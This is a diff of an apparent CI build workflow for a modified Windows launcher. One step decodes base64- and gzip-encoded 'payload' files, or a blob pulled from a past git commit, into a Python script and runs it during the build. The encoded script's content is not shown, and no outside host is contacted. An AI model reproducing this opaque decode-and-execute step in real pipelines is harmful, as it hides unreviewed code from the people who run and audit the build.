@@ -13,6 +13,8 @@ jobs:
     steps:
       - name: Checkout WINSUNG build repo
         uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
 
       - name: Checkout Jovanovski Windows Launcher v2.1.0
         run: |
@@ -21,11 +23,14 @@ jobs:
       - name: Apply privacy baseline
         run: python3 scripts/prepare_source.py
 
-      - name: Apply complete WINSUNG masterpiece modifications
+      - name: Restore and apply known-good WINSUNG masterpiece generator
         run: |
-          cat payload/mp0.b64 payload/mp1.b64 payload/mp2.b64 payload/mp3.b64 | base64 -d | gzip -d > /tmp/add_masterpiece.py
+          git show 3d3cc920281463e52c27ceaf965c982504f96483:payload/masterpiece.py.gz.b64 | base64 -d | gzip -d > /tmp/add_masterpiece.py
           python3 -m py_compile /tmp/add_masterpiece.py
           python3 /tmp/add_masterpiece.py
+
+      - name: Apply post-masterpiece privacy hardening
+        run: python3 scripts/post_masterpiece_hardening.py
 
       - name: Privacy audit source tree
         run: |
